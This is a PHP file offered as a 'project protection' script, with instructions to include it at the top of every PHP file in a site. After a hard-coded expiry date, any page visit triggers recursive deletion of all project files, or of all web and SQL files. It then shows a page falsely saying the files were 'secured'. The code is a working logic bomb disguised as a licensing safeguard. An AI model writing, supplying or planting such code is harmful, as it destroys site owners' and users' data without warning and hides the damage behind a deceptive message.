<?php

class ProjectProtection {
    private $expiryDate;
    private $deleteAll;
    private $protectionFile;
    
    public function __construct($expiryDate = '2025-07-10', $deleteAll = true) {
        $this->expiryDate = $expiryDate;
        $this->deleteAll = $deleteAll;
        $this->protectionFile = __DIR__ . '/.protection_active';
        
        // Check protection status
        $this->checkProtection();
    }
    
    private function checkProtection() {
        $currentDate = date('Y-m-d');
        
        // If already protected, show expired page
        if (file_exists($this->protectionFile)) {
            $this->showExpiredPage();
            exit();
        }
        
        // If expired, activate protection
        if ($currentDate > $this->expiryDate) {
            $this->activateProtection();
        }
    }
    
    private function activateProtection() {
        // Mark as protected
        file_put_contents($this->protectionFile, date('Y-m-d H:i:s'));
        
        // Delete files
        if ($this->deleteAll) {
            $this->deleteAllFiles();
        } else {
            $this->deleteWebFiles();
        }
        
        // Show expired page
        $this->showExpiredPage();
        exit();
    }
    
    private function deleteAllFiles() {
        $projectDir = __DIR__;
        $keepFiles = ['.protection_active', 'expired.html'];
        
        $files = scandir($projectDir);
        foreach ($files as $file) {
            if ($file == '.' || $file == '..' || in_array($file, $keepFiles)) {
                continue;
            }
            
            $filePath = $projectDir . DIRECTORY_SEPARATOR . $file;
            
            if (is_dir($filePath)) {
                $this->deleteDirectory($filePath);
            } else {
                @unlink($filePath);
            }
        }
    }
    
    private function deleteWebFiles() {
        $projectDir = __DIR__;
        $webExtensions = ['.php', '.html', '.htm', '.css', '.js', '.sql'];
        $keepFiles = ['protection.php', '.protection_active'];
        
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($projectDir),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $filename = $file->getFilename();
                
                if (in_array($filename, $keepFiles)) {
                    continue;
                }
                
                $extension = strtolower('.' . $file->getExtension());
                if (in_array($extension, $webExtensions)) {
                    @unlink($file->getPathname());
                }
            }
        }
    }
    
    private function deleteDirectory($dir) {
        if (!is_dir($dir)) return;
        
        $files = array_diff(scandir($dir), array('.', '..'));
        foreach ($files as $file) {
            $filePath = $dir . DIRECTORY_SEPARATOR . $file;
            
            if (is_dir($filePath)) {
                $this->deleteDirectory($filePath);
            } else {
                @unlink($filePath);
            }
        }
        @rmdir($dir);
    }
    
    private function showExpiredPage() {
        $html = '<!DOCTYPE html>
<html>
<head>
    <title>Access Expired</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 500px;
        }
        h1 { color: #e74c3c; margin-bottom: 20px; }
        .icon { font-size: 60px; margin-bottom: 20px; }
        p { color: #666; line-height: 1.6; }
        .date { background: #f8f9fa; padding: 10px; border-radius: 5px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🔒</div>
        <h1>Project Access Expired</h1>
        <p>This project has been automatically protected due to expiration.</p>
        <div class="date">
            <strong>Expired on:</strong> ' . $this->expiryDate . '<br>
            <strong>Protected on:</strong> ' . date('Y-m-d H:i:s') . '
        </div>
        <p><em>All project files have been secured.</em></p>
    </div>
</body>
</html>';
        
        file_put_contents(__DIR__ . '/expired.html', $html);
        echo $html;
    }
    
    public static function getRemainingDays($expiryDate) {
        $current = new DateTime();
        $expiry = new DateTime($expiryDate);
        $diff = $current->diff($expiry);
        
        if ($current > $expiry) {
            return 0;
        }
        
        return $diff->days;
    }
}

// Auto-execute protection (change the date here)
new ProjectProtection('2025-07-15', true); // true = delete all, false = only web files

?>

<!-- 
USAGE INSTRUCTIONS:

1. Save this file as "protection.php" in your project root

2. Add this line to the TOP of every PHP file:
   <?php require_once 'protection.php'; ?>

3. Or add it to your main index.php like this:
   <?php 
   require_once 'protection.php';
   // Your normal code here
   ?>

4. The protection will activate automatically when someone visits any page after the expiry date

5. To check remaining days in your pages:
   <?php echo ProjectProtection::getRemainingDays('2025-07-15'); ?> days left

-->